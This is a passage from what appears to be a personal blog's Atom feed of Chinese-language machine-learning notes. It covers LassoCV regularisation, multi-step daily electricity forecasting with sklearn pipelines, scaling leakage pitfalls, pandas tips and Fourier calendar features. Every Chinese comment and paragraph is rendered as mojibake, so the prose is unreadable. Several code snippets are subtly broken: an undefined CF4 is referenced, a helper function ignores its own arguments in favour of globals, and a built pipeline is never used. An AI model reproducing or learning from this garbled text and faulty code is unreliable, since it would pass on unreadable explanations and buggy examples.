class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoCV</span><br><span class="line"><span class="comment">#è‡ªå·±å»ºç«‹Lassoè¿›è¡Œalphaé€‰æ‹©çš„èŒƒå›´</span></span><br><span class="line">alpharange = np.logspace(-<span class="number">10</span>, -<span class="number">2</span>, <span class="number">200</span>,base=<span class="number">10</span>) <span class="comment">#å…¶å®æ˜¯å½¢æˆ10ä¸ºåº•çš„æŒ‡æ•°å‡½æ•°</span></span><br><span class="line"><span class="comment">#10**(-10)åˆ°10**(-2)æ¬¡æ–¹</span></span><br><span class="line">alpharange.shape</span><br><span class="line">Xtrain.head()</span><br><span class="line">lasso_ = LassoCV(alphas=alpharange <span class="comment">#è‡ªè¡Œè¾“å…¥çš„alphaçš„å–å€¼èŒƒå›´</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ,cv=<span class="number">5</span> <span class="comment">#äº¤å‰éªŒè¯çš„æŠ˜æ•°</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain) <span class="comment">#æŸ¥çœ‹è¢«é€‰æ‹©å‡ºæ¥çš„æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°</span></span><br><span class="line">lasso_.alpha_</span><br><span class="line"><span class="comment">#è°ƒç”¨æ‰€æœ‰äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line">lasso_.mse_path_</span><br><span class="line">lasso_.mse_path_.shape <span class="comment">#è¿”å›æ¯ä¸ªalphaä¸‹çš„äº”æŠ˜äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line">lasso_.mse_path_.mean(axis=<span class="number">1</span>) <span class="comment">#æœ‰æ³¨æ„åˆ°åœ¨å²­å›å½’ä¸­æˆ‘ä»¬çš„è½´å‘æ˜¯axis=0å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">#åœ¨å²­å›å½’å½“ä¸­ï¼Œæˆ‘ä»¬æ˜¯ç•™ä¸€éªŒè¯ï¼Œå› æ­¤æˆ‘ä»¬çš„äº¤å‰éªŒè¯ç»“æœè¿”å›çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬åœ¨æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯ç»“æœ</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ä»¬è¦æ±‚æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯å‡å€¼ï¼Œå°±æ˜¯axis=0ï¼Œè·¨è¡Œæ±‚å‡å€¼</span></span><br><span class="line"><span class="comment">#è€Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¿”å›çš„æ˜¯ï¼Œæ¯ä¸€ä¸ªalphaå–å€¼ä¸‹ï¼Œæ¯ä¸€æŠ˜äº¤å‰éªŒè¯çš„ç»“æœ</span></span><br><span class="line"><span class="comment">#å› æ­¤æˆ‘ä»¬è¦æ±‚æ¯ä¸ªalphaä¸‹çš„äº¤å‰éªŒè¯å‡å€¼ï¼Œå°±æ˜¯axis=1ï¼Œè·¨åˆ—æ±‚å‡å€¼</span></span><br><span class="line"><span class="comment">#æœ€ä½³æ­£åˆ™åŒ–ç³»æ•°ä¸‹è·å¾—çš„æ¨¡å‹çš„ç³»æ•°ç»“æœ</span></span><br><span class="line">lasso_.coef_</span><br><span class="line">lasso_.score(Xtest,Ytest) <span class="comment">#ä¸çº¿æ€§å›å½’ç›¸æ¯”å¦‚ä½•ï¼Ÿ</span></span><br><span class="line">reg = LinearRegression().fit(Xtrain,Ytrain)</span><br><span class="line">reg.score(Xtest,Ytest) <span class="comment">#ä½¿ç”¨lassoCVè‡ªå¸¦çš„æ­£åˆ™åŒ–è·¯å¾„é•¿åº¦å’Œè·¯å¾„ä¸­çš„alphaä¸ªæ•°æ¥è‡ªåŠ¨å»ºç«‹alphaé€‰æ‹©çš„èŒƒå›´</span></span><br><span class="line">ls_ = LassoCV(eps=<span class="number">0.00001</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,n_alphas=<span class="number">300</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  ,cv=<span class="number">5</span></span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  ).fit(Xtrain, Ytrain)</span><br><span class="line">ls_.alpha_</span><br><span class="line">ls_.alphas_ <span class="comment">#æŸ¥çœ‹æ‰€æœ‰è‡ªåŠ¨ç”Ÿæˆçš„alphaå–å€¼</span></span><br><span class="line">ls_.alphas_.shape</span><br><span class="line">ls_.score(Xtest,Ytest)</span><br><span class="line">ls_.coef_</span><br></pre></td></tr></table></figure><h3><span id="å¤šæ­¥é•¿æ—¶é—´åºåˆ—">å¤šæ­¥é•¿æ—¶é—´åºåˆ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_columns&#x27;</span>, <span class="literal">None</span>) <span class="comment"># å±•ç¤ºæ‰€æœ‰åˆ—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®å¤„ç†</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.month</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>] = df[<span class="string">&#x27;Date&#x27;</span>].dt.dayofweek</span><br><span class="line">df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]] = df[[<span class="string">&#x27;holiday&#x27;</span>,<span class="string">&#x27;month&#x27;</span>,<span class="string">&#x27;dayofweek&#x27;</span>]].astype(<span class="string">&#x27;object&#x27;</span>)</span><br><span class="line">df = pd.get_dummies(df)</span><br><span class="line">df.drop(<span class="string">&#x27;Season&#x27;</span>,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line">df.info()</span><br><span class="line">df.set_index(<span class="string">&#x27;Date&#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line">data = df.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›¸å…³å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_lag</span>(<span class="params">df,l_beg = <span class="number">1</span>,l_end = <span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l_beg,l_end):</span><br><span class="line">        df[<span class="string">&#x27;lag_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)] = df.DailyElectricity.shift(i)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_data</span>(<span class="params">n_days,df,indx</span>):</span><br><span class="line">    Y_val = df.iloc[-n_days:,indx].copy()</span><br><span class="line">    df.iloc[-n_days:,indx]=<span class="number">0</span></span><br><span class="line">    make_lag(df)</span><br><span class="line">    X_val = df.iloc[-n_days:].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    df.dropna(inplace=<span class="literal">True</span>)</span><br><span class="line">    X = df[:-n_days].drop(<span class="string">&#x27;DailyElectricity&#x27;</span>,axis=<span class="number">1</span>)</span><br><span class="line">    Y = df[:-n_days][<span class="string">&#x27;DailyElectricity&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> X,Y,X_val,Y_val</span><br><span class="line">  </span><br><span class="line">df = data.copy()</span><br><span class="line">X,Y,X_val,Y_val = split_data(<span class="number">365</span>,df,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> AdaBoostRegressor,RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression,Lasso,LassoLars,SGDRegressor,Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_models</span>(<span class="params">models=&#123;&#125;</span>):</span><br><span class="line">    models[<span class="string">&#x27;AdaBoostRegressor&#x27;</span>]=AdaBoostRegressor()</span><br><span class="line">    models[<span class="string">&#x27;RandomForestRegressor&#x27;</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">&#x27;GradientBoostingRegressor&#x27;</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">&#x27;LinearRegression&#x27;</span>]=LinearRegression()</span><br><span class="line">    models[<span class="string">&#x27;Lasso&#x27;</span>]=Lasso()</span><br><span class="line">    models[<span class="string">&#x27;LassoLars&#x27;</span>]=LassoLars()</span><br><span class="line">    models[<span class="string">&#x27;SGDRegressor&#x27;</span>]=SGDRegressor()</span><br><span class="line">    models[<span class="string">&#x27;Ridge&#x27;</span>]=Ridge()</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_pipe</span>(<span class="params">model</span>):</span><br><span class="line">    steps = [(<span class="string">&#x27;s&#x27;</span>,StandardScaler()),(<span class="string">&#x27;m&#x27;</span>,model)]</span><br><span class="line">    <span class="keyword">return</span> Pipeline(steps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">val</span>(<span class="params">model,x,y,cv=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(model,X,Y,cv=cv).mean()</span><br><span class="line"></span><br><span class="line">s = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n,m <span class="keyword">in</span> get_models().items():</span><br><span class="line">    p = make_pipe(m)</span><br><span class="line">    s[n]=val(m,X,Y)</span><br><span class="line">order = <span class="built_in">sorted</span>(s.items(),key = <span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line">order</span><br><span class="line"></span><br><span class="line">pipe = make_pipe(GradientBoostingRegressor())</span><br><span class="line">best_model = pipe.fit(X,Y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pred_date</span>(<span class="params">X_val</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(X_val.shape[<span class="number">0</span>]):</span><br><span class="line">        pred = best_model.predict(np.array(X_val.iloc[i]).reshape(<span class="number">1</span>,-<span class="number">1</span>))</span><br><span class="line">        res.append(pred)</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">1</span> &lt; X_val.shape[<span class="number">0</span>]:</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">30</span>:] = X_val.iloc[i,-<span class="number">31</span>:-<span class="number">1</span>]</span><br><span class="line">            X_val.iloc[i+<span class="number">1</span>,-<span class="number">31</span>]=pred</span><br><span class="line">    <span class="keyword">return</span> X_val,res</span><br><span class="line">  </span><br><span class="line">X_val,res = pred_date(X_val) </span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score,mean_squared_error</span><br><span class="line">mean_squared_error(Y_val,res)</span><br><span class="line">r2_score(Y_val,res)</span><br></pre></td></tr></table></figure><h2><span id="è¸©å‘">è¸©å‘</span></h2><ul><li>å…³äºæ•°æ®é¢„å¤„ç†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">é¢„å¤„ç†çš„æ—¶å€™ä¸èƒ½</span></span><br><span class="line"><span class="string">scaler.fit_trainsform(Xtest)</span></span><br><span class="line"><span class="string">æˆ–è€…</span></span><br><span class="line"><span class="string">scaler.fit(Xtest)</span></span><br><span class="line"><span class="string">scaler.transform(Xtest)</span></span><br><span class="line"><span class="string">å› ä¸ºä¼šå¯¼è‡´æ•°æ®æ³„éœ²</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">scaler.fit(Xtrain)</span><br><span class="line">X_train =scaler.transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br><span class="line"></span><br><span class="line">scaler = StandardScaler() <span class="comment">#å®ä¾‹åŒ–</span></span><br><span class="line">X_train =scaler.fit_transform(Xtrain)</span><br><span class="line">X_test =scaler.transform(Xtest)</span><br><span class="line">norm = MinMaxScaler()</span><br><span class="line">norm.fit(Xtrain)</span><br><span class="line">X_train = norm.fit_transform(Xtrain)</span><br><span class="line">X_test = norm.transform(Xtest)</span><br></pre></td></tr></table></figure><ul><li><p>å…³äºé¢„æµ‹</p><p>é¢„æµ‹çš„æ—¶å€™è¦å°†æ•´ä¸ªæ•°æ®æ‹¿å»fit,ç„¶åå†å»predict</p></li></ul><h2><span id="trick">Trick</span></h2><ul><li><p>get_dummiesçš„æ—¶å€™æœ€å¥½å…ˆæŠŠ é¢„æµ‹é›†å’Œæµ‹è¯•é›†åˆå¹¶å†åˆ†å¼€X[:x.shape[0]]</p></li><li><p>factorizedè½¬æ¢å›å»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">orig_col = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">labels, uniques = pd.factorize(orig_col)</span><br><span class="line"></span><br><span class="line"><span class="comment"># To get original list back</span></span><br><span class="line">uniques[labels]</span><br><span class="line"><span class="comment"># array([&#x27;b&#x27;, &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, &#x27;b&#x27;], dtype=object)</span></span><br></pre></td></tr></table></figure></li><li><p>pandasæ”¹å˜è¡Œåºåˆ—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df[col]</span><br></pre></td></tr></table></figure></li><li><p>æŒ‰æœˆä»½ç»Ÿè®¡ </p><ul><li>A æ˜ŸæœŸ</li><li>B æœˆä»½</li></ul><p><code>df.groupby(df[&#39;date&#39;].dt.strftime(&#39;%B&#39;))[&#39;price&#39;].mean()</code></p><p><code>df[&#39;month&#39;] = df[&#39;Date&#39;].dt.month</code></p></li><li><p>æ’åºåæŒ‰è‡ªå®šä¹‰é¡ºåºæ˜¾ç¤º</p><p><code>cat = [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]</code></p><p><code>df.groupby(&#39;f&#39;).reindex(cat)</code></p></li><li><p>é€è§†</p><p><code>df = df.groupby(&#39;name&#39;,&#39;year&#39;)[&#39;gdp&#39;].sum().reindex()</code></p><p><code>df.pivot(index=&#39;name&#39;,columns=&#39;year&#39;,values=&#39;gdp&#39;)</code></p><p>![é€è§†å‰](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220310161405868.png)</p><p>![é€è§†å](&#x2F;Users&#x2F;disda&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220310161422071.png)</p><p><strong>å®šç±»æ•°æ®</strong></p><p>å­—ç¬¦å‹ï¼Œæ­¤ç±»æ•°æ®åªä»£è¡¨â€œç±»åˆ«â€ï¼Œç±»åˆ«ä¸ç±»åˆ«ä¹‹é—´æ²¡æœ‰å¿…ç„¶çš„ç›¸å…³å…³ç³»ï¼Œæä¾›çš„ä¿¡æ¯é‡ä¹Ÿæœ€å°‘ã€‚ä¾‹å¦‚ï¼ˆé¢œè‰²ï¼šçº¢è‰²ï¼Œé»„è‰²ï¼Œè“è‰²ï¼Œç»¿è‰²ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šï½ï½ï½…ï¼ï½ˆï½ï½”ç¼–ç </p><p><strong>å®šåºæ•°æ®</strong></p><p>å­—ç¬¦å‹ï¼Œæ­¤ç±»æ•°æ®ä»£è¡¨â€œç±»åˆ«â€çš„åŒæ—¶ç±»åˆ«ä¸ç±»åˆ«ä¹‹é—´å¯ä»¥æ¯”è¾ƒï¼Œæœ‰é¡ºåºã€‚ä¾‹å¦‚ï¼ˆå“è´¨ï¼šä¼˜ï¼Œè‰¯ï¼Œä¸­ï¼Œå·®ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šå¯¹å­—ç¬¦å‹æ•°å€¼èµ‹å€¼</p><p><strong>å®šè·æ•°æ®</strong></p><p>æ•°å€¼å‹ï¼Œå¯åŠ å‡ã€‚ç”¨äºç»Ÿè®¡è®¡æ•°ã€‚ä¾‹å¦‚ï¼ˆå§å®¤æ•°é‡ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šæå·®ç¼©æ”¾ï¼Œæ ‡å‡†åŒ–</p><p><strong>å®šæ¯”æ•°æ®</strong></p><p>æ•°å€¼å‹ï¼Œå¯åŠ å‡ä¹˜é™¤ï¼Œæœ‰ç»å¯¹â€œï¼â€å€¼çš„æ¦‚å¿µã€‚ä¾‹å¦‚ï¼ˆå·¥èµ„ï¼Œï¿¥ï¼‘ï¼ï¼æ˜¯ï¿¥ï¼•ï¼çš„ï¼’å€ï¼‰</p><p>å¤„ç†æ–¹å¼ï¼šæå·®ç¼©æ”¾ï¼Œæ•°å€¼å½’ä¸€åŒ–ï¼Œæ ‡å‡†åŒ–</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æœºå™¨å­¦ä¹ " scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="æœºå™¨å­¦ä¹ " scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ æ—¶é—´åºåˆ—å®æˆ˜</title>
    <link href="https://disda-coding.github.io/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/"/>
    <id>https://disda-coding.github.io/2022/02/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E5%AE%9E%E6%88%98/</id>
    <published>2022-02-14T02:58:06.000Z</published>
    <updated>2023-03-29T01:01:32.122Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%99%AE%E9%80%9A%E7%9A%84%E7%89%B9%E5%BE%81">æ™®é€šçš„ç‰¹å¾</a></li><li><a href="#%E5%82%85%E9%87%8C%E5%8F%B6%E7%BA%A7%E6%95%B0">å‚…é‡Œå¶çº§æ•°</a></li><li><a href="#diff%E5%B7%AE%E5%88%86shift%E5%B9%B3%E7%A7%BBewmrolling">diffå·®åˆ†&#x2F;shiftå¹³ç§»&#x2F;ewm&#x2F;rolling</a></li><li><a href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95">éªŒè¯æ–¹æ³•</a></li></ul><!-- tocstop --><h2><span id="æ™®é€šçš„ç‰¹å¾">æ™®é€šçš„ç‰¹å¾</span></h2><p><strong>ä¸è¦è®¤ä¸ºç»“æœé›†çš„monthæ²¡æœ‰å‡ºç°åœ¨è®­ç»ƒé›†å°±ä¸åŠ ï¼Œè¦ç›¸ä¿¡æ¨¡å‹çš„èƒ½åŠ›ã€‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID = <span class="string">&#x27;DateTime&#x27;</span></span><br><span class="line"><span class="comment"># df[&#x27;year&#x27;] = df[ID].dt.year </span></span><br><span class="line">df[<span class="string">&#x27;month&#x27;</span>]=df[ID].dt.month</span><br><span class="line">df[<span class="string">&#x27;quarter&#x27;</span>]=df[ID].dt.quarter</span><br><span class="line">df[<span class="string">&#x27;day&#x27;</span>]=df[ID].dt.day</span><br><span class="line">df[<span class="string">&#x27;dayofweek&#x27;</span>]=df[ID].dt.dayofweek</span><br><span class="line">df[<span class="string">&#x27;dayofyear&#x27;</span>]=df[ID].dt.dayofyear</span><br><span class="line">df[<span class="string">&#x27;week&#x27;</span>]=df[ID].dt.week</span><br><span class="line">df[<span class="string">&#x27;hour&#x27;</span>]=df[ID].dt.hour</span><br><span class="line">df[<span class="string">&#x27;weekend&#x27;</span>]=df[<span class="string">&#x27;dayofweek&#x27;</span>].apply(<span class="keyword">lambda</span> x:<span class="number">1</span> <span class="keyword">if</span> x&gt;=<span class="number">5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2><span id="å‚…é‡Œå¶çº§æ•°">å‚…é‡Œå¶çº§æ•°</span></h2><p><strong>ä½¿å¾—æœˆä»½ï¼Œå¤©æ•°ç­‰ç­‰è¿ç»­ï¼Œä¾‹å¦‚1-12æœˆï¼Œ1å’Œ12å·®è·è¿‡å¤§ï¼Œå¦‚æœä½¿ç”¨å‚…é‡Œå¶çº§æ•°çš„è¯ç›¸å½“äºå˜æˆsinæˆ–è€…cosè¡¨ç¤ºï¼Œå½¢æˆä¸€ä¸ªåœ†ã€‚</strong></p><ul><li>å…¶ä¸­<strong>fs</strong>æ˜¯çœ‹æ•°æ®çš„ï¼Œåƒè¿™ä¸ªæ•°æ®ç»™çš„æ˜¯ä¸€å°æ—¶é‡‡æ ·6æ¬¡æ•°æ®ï¼Œä¸€å¹´å°±æ˜¯1*6*24*365ï¼Œå¦‚æœæ˜¯ä¸€å¤©ä¸€é‡‡çš„æ•°æ®å°±365</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.signal <span class="keyword">import</span> periodogram</span><br><span class="line">F,S=periodogram(tr[out_cols],fs=<span class="number">1</span>*<span class="number">6</span>*<span class="number">24</span>*<span class="number">365</span>,detrend=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">plt.plot(F,S)</span><br><span class="line">plt.xscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">plt.xticks([<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">52</span>,<span class="number">104</span>,<span class="number">365</span>,<span class="number">365</span>*<span class="number">2</span>],[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;hA&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;hM&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;hW&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;hD&#x27;</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹å›¾åƒæœ€é«˜çš„å€¼ï¼Œæ—¶é—´ç›¸å…³æ€§å°±ä¼šæ¯”è¾ƒé«˜</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x27;B&#x27; - business day, ie., Mon. - Fri.</span><br><span class="line">&#x27;D&#x27; - daily</span><br><span class="line">&#x27;W&#x27; - weekly</span><br><span class="line">&#x27;M&#x27; - monthly</span><br><span class="line">&#x27;A&#x27; - annual</span><br><span class="line">&#x27;Q&#x27; - quarterly</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess,CalendarFourier</span><br><span class="line"><span class="comment">#å‚…é‡Œå¶</span></span><br><span class="line">CF1=CalendarFourier(<span class="string">&#x27;A&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">CF2=CalendarFourier(<span class="string">&#x27;W&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">CF3=CalendarFourier(<span class="string">&#x27;D&#x27;</span>,<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(index=df.DateTime,additional_terms=[CF1,CF2,CF3,CF4]).in_sample()</span><br><span class="line">df = df.merge(dp,left_on=<span class="string">&#x27;datetime&#x27;</span>,right_index=<span class="literal">True</span>,how=<span class="string">&#x27;left&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 